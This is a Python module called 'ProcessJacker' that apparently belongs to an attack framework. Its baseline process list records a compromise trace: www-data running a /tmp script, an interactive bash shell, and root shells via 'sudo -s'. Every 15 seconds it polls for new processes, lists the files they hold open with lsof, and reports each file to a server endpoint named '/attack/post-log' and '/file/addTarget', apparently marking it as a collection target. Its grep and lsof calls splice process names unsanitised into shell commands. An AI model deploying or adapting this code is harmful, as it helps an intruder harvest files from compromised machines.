# -*- coding: utf-8 -*-
"""
Created on Sat Jan 23 23:05:03 2021

@author: 백승훈, GoldBigDragon
"""
from datetime import datetime
import threading
import subprocess
import main
import json
import os
global BREACHED
BREACHED = []
global moduleName
moduleName = 'ProcessJacker'

global Original_Processlist
Original_Processlist = [['UID','CMD'], ['root', '/sbin/init'], ['root', '[kthreadd]'], ['root', '[ksoftirqd/0]'],
                        ['root', '[kworker/0:0H]'], ['root', '[rcu_sched]'], ['root', '[rcu_bh]'], ['root', '[migration/0]'],
                        ['root', '[watchdog/0]'], ['root', '[kdevtmpfs]'], ['root', '[netns]'], ['root', '[perf]'],
                        ['root', '[khungtaskd]'], ['root', '[writeback]'], ['root', '[ksmd]'], ['root', '[khugepaged]'],
                        ['root', '[crypto]'], ['root', '[kintegrityd]'], ['root', '[bioset]'], ['root', '[kblockd]'], ['root', '[ata_sff]'],
                        ['root', '[md]'], ['root', '[devfreq_wq]'], ['root', '[kswapd0]'], ['root', '[vmstat]'],
                        ['root', '[fsnotify_mark]'], ['root', '[ecryptfs-kthrea]'], ['root', '[kthrotld]'],
                        ['root', '[acpi_thermal_pm]'], ['root', '[bioset]'], ['root', '[bioset]'], ['root', '[bioset]'],
                        ['root', '[bioset]'], ['root', '[bioset]'], ['root', '[bioset]'], ['root', '[bioset]'], ['root', '[bioset]'],
                        ['root', '[scsi_eh_0]'], ['root', '[scsi_tmf_0]'], ['root', '[scsi_eh_1]'], ['root', '[scsi_tmf_1]'],
                        ['root', '[ipv6_addrconf]'], ['root', '[deferwq]'], ['root', '[charger_manager]'], ['root', '[mpt_poll_0]'],
                        ['root', '[mpt/0]'], ['root', '[kpsmoused]'], ['root', '[scsi_eh_2]'], ['root', '[scsi_tmf_2]'],
                        ['root', '[bioset]'], ['root', '[ttm_swap]'], ['root', '[scsi_eh_3]'], ['root', '[scsi_tmf_3]'],
                        ['root', '[scsi_eh_4]'], ['root', '[scsi_tmf_4]'], ['root', '[scsi_eh_5]'], ['root', '[scsi_tmf_5]'],
                        ['root', '[scsi_eh_6]'], ['root', '[scsi_tmf_6]'], ['root', '[scsi_eh_7]'], ['root', '[scsi_tmf_7]'],
                        ['root', '[scsi_eh_8]'], ['root', '[scsi_tmf_8]'], ['root', '[scsi_eh_9]'], ['root', '[scsi_tmf_9]'],
                        ['root', '[scsi_eh_10]'], ['root', '[scsi_tmf_10]'], ['root', '[scsi_eh_11]'], ['root', '[scsi_tmf_11]'],
                        ['root', '[scsi_eh_12]'], ['root', '[scsi_tmf_12]'], ['root', '[scsi_eh_13]'], ['root', '[scsi_tmf_13]'],
                        ['root', '[scsi_eh_14]'], ['root', '[scsi_tmf_14]'], ['root', '[scsi_eh_15]'], ['root', '[scsi_tmf_15]'],
                        ['root', '[scsi_eh_16]'], ['root', '[scsi_tmf_16]'], ['root', '[scsi_eh_17]'], ['root', '[scsi_tmf_17]'],
                        ['root', '[scsi_eh_18]'], ['root', '[scsi_tmf_18]'], ['root', '[scsi_eh_19]'], ['root', '[scsi_tmf_19]'],
                        ['root', '[scsi_eh_20]'], ['root', '[scsi_tmf_20]'], ['root', '[scsi_eh_21]'], ['root', '[scsi_tmf_21]'],
                        ['root', '[scsi_eh_22]'], ['root', '[scsi_tmf_22]'], ['root', '[scsi_eh_23]'], ['root', '[scsi_tmf_23]'],
                        ['root', '[scsi_eh_24]'], ['root', '[scsi_tmf_24]'], ['root', '[scsi_eh_25]'], ['root', '[scsi_tmf_25]'],
                        ['root', '[scsi_eh_26]'], ['root', '[scsi_tmf_26]'], ['root', '[scsi_eh_27]'], ['root', '[scsi_tmf_27]'],
                        ['root', '[scsi_eh_28]'], ['root', '[scsi_tmf_28]'], ['root', '[scsi_eh_29]'], ['root', '[scsi_tmf_29]'],
                        ['root', '[scsi_eh_30]'], ['root', '[scsi_tmf_30]'], ['root', '[scsi_eh_31]'], ['root', '[scsi_tmf_31]'],
                        ['root', '[scsi_eh_32]'], ['root', '[scsi_tmf_32]'], ['root', '[bioset]'], ['root', '[kworker/0:1H]'],
                        ['root', '[raid5wq]'], ['root', '[kdmflush]'], ['root', '[bioset]'], ['root', '[kdmflush]'], ['root', '[bioset]'],
                        ['root', '[bioset]'], ['root', '[jbd2/dm-0-8]'], ['root', '[ext4-rsv-conver]'],
                        ['root', '/lib/systemd/systemd-journald'], ['root', '[kauditd]'], ['root', '[iscsi_eh]'],
                        ['root', '/sbin/lvmetad -f'], ['root', '/lib/systemd/systemd-udevd'], ['root', '[ib_addr]'],
                        ['root', '[ib_mcast]'], ['root', '[ib_nl_sa_wq]'], ['root', '[ib_cm]'], ['root', '[iw_cm_wq]'],
                        ['root', '[rdma_cm]'], ['root', '[ext4-rsv-conver]'], ['systemd+', '/lib/systemd/systemd-timesyncd'],
                        ['root', '/usr/lib/accountsservice/accounts-daemon'], ['root', '/usr/bin/lxcfs /var/lib/lxcfs/'],
                        ['message+','/usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation'],
                        ['root', '/usr/sbin/acpid'], ['root', '/usr/bin/vmtoolsd', 'daemon,/usr/sbin/atd -f'],
                        ['root', '/lib/systemd/systemd-logind'], ['root', '/usr/lib/snapd/snapd'],
                        ['syslog','/usr/sbin/rsyslogd -n'],
                        ['root', '/sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog'],
                        ['root', '/usr/lib/policykit-1/polkitd --no-debug'], ['root', '/sbin/iscsid'], ['root', '/sbin/iscsid'],
                        ['root', '/bin/login --', 'mysql,/usr/sbin/mysqld'], ['root', '/usr/sbin/sshd -D'],
                        ['user','/lib/systemd/systemd --user'], ['user','(sd-pam)'], ['user','-bash'],
                        ['root', '/usr/sbin/apache2 -k start'], ['www-data', '/usr/sbin/apache2 -k start'],
                        ['www-data', '/usr/sbin/apache2 -k start'], ['www-data', '/usr/sbin/apache2 -k start'],
                        ['www-data', '/usr/sbin/apache2 -k start'], ['www-data', '/usr/sbin/apache2 -k start'],
                        ['www-data', '/usr/sbin/apache2 -k start'], ['root', 'sshd: user [priv]'], ['user','sshd: user@pts/2'],
                        ['user','-bash'], ['www-data', '/usr/sbin/apache2 -k start'], ['www-data', '/usr/sbin/apache2 -k start'],
                        ['www-data', '/usr/sbin/apache2 -k start'], ['www-data', 'sh -c /tmp/testmp/ls.sh'],
                        ['www-data', '/bin/bash /tmp/testmp/ls.sh'], ['www-data', 'bash -i'], ['www-data', './pwd'],
                        ['root', 'sh -c /bin/bash'], ['root', '/bin/bash'], ['root', '/usr/bin/pwd'], ['root', 'sh -c /bin/bash'],
                        ['root', '/bin/bash'], ['root', 'sudo -s'], ['root', '/bin/bash'], ['root', '[kworker/u256:2]'],
                        ['systemd+', '/lib/systemd/systemd-networkd'],
                        ['root', '/sbin/dhclient -1 -v -pf /run/dhclient.ens33.pid -lf /var/lib/dhcp/dhclient.ens33.leases -I -df /var/lib/dhcp/dhclient6.ens33.leases ens33'],
                        ['root', '[kworker/0:0]'], ['root', '[kworker/0:3]'], ['root', '/usr/sbin/cron -f'],
                        ['www-data', '/usr/sbin/apache2 -k start'], ['root', '[kworker/u256:1]'], ['root', '[kworker/0:1]'],
                        ['root', '[kworker/u256:0]'], ['root', '[kworker/u257:0]'], ['root', '[hci0]'], ['root', '[hci0]'],
                        ['root', '[kworker/u257:1]'], ['root', '[kworker/u257:2]'], ['root', 'sshd: user [priv]'],
                        ['root', 'sshd: user [priv]'], ['user','sshd: user@pts/0'], ['user','sshd: user@notty'],
                        ['user','/usr/lib/openssh/sftp-server'], ['root', '[kworker/0:2]'], ['user','-bash'], ['user','ps -eaf']]

def parsepseaf():
    global Original_Processlist
    lines = subprocess.getoutput("ps -eaf | awk '{print $1, $8, $9, $10, $11, $12, $13, $14, $15, $16, $17, $18}'").split('\n')
    del lines[0]
    cmds = []
    for row in lines:
        tabs = row.split(' ')
        realTabs = []
        for i in range(len(tabs)):
            if tabs[i] != ' ' and tabs[i] != '':
                realTabs.append(tabs[i])
        joinedCmd = ' '.join(realTabs[1:]).strip()
        dataLine = [realTabs[0].strip(), joinedCmd]
        if joinedCmd not in cmds and dataLine not in Original_Processlist and (
                'cpuhp' not in joinedCmd and 'idle_inject/' not in joinedCmd and 'migration/' not in joinedCmd and
                'ksoftirqd/' not in joinedCmd and 'rcu_' not in joinedCmd and 'scsi_' not in joinedCmd and 
                '[kthreadd]' not in joinedCmd and '[mm_percpu_wq]' not in joinedCmd and 'kworker/' not in joinedCmd and
                'kdevtmpfs' not in joinedCmd and 'kauditd' not in joinedCmd and 'khungtaskd' not in joinedCmd and
                'oom_reaper' not in joinedCmd and 'netns' not in joinedCmd and 'writeback' not in joinedCmd and
                'kcompactd' not in joinedCmd and 'ksmd' not in joinedCmd and 'khugepaged' not in joinedCmd and
                'kintegrityd' not in joinedCmd and 'scsi_tmf_' not in joinedCmd):
            cmds.append(joinedCmd)
    return cmds

def getinfo(cmd):
    tabs = cmd.split(' ')
    if(tabs[0] == 'sudo'):
        grepinput = tabs[1]
    else:
        grepinput = tabs[0]
    directoryArray = []
    pids = subprocess.getoutput("ps -eaf | grep '" + grepinput + "' | awk '{print $2}'").split('\n')
    for pid in pids:
        directories = subprocess.getoutput('lsof -p ' + pid + " | grep -v mem | grep -v IP | grep -v type= | awk '{print $9}'").split('\n')
        for directory in directories:
            stripedDirectory = directory.strip()
            if len(stripedDirectory) > 1 and stripedDirectory not in directoryArray:
                directoryArray.append(stripedDirectory)
    return directoryArray

def findnewprocess():
    result = []
    for cmd in parsepseaf():
        for file in getinfo(cmd):
            if file not in result:
                result.append(file)
    return result

def runThread():
    global BREACHED
    targets = findnewprocess()
    nowTime = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    for target in targets:
        if target not in BREACHED and 'ib_logfile' not in target and 'ibtmp1' not in target and 'ibdata1' not in target and 'mysqld' not in target and '.ibd' not in target:
            BREACHED.append(target)
            sendApiServer(nowTime, target)
    if main.start:
        threading.Timer(15, runThread).start()

def sendApiServer(time, filePath):
    global subUrl
    global moduleName
    if os.path.exists(filePath):
        if os.path.isfile(filePath):
            data = {'time': time, 'type': moduleName, 'message': "ProcessJacker collected '" + filePath + "'"}
            main.serverSender('/attack/post-log', json.dumps(data))
            data = {'filePath':filePath, 'isDir':0}
            main.serverSender('/file/addTarget', json.dumps(data))

def start():
    runThread()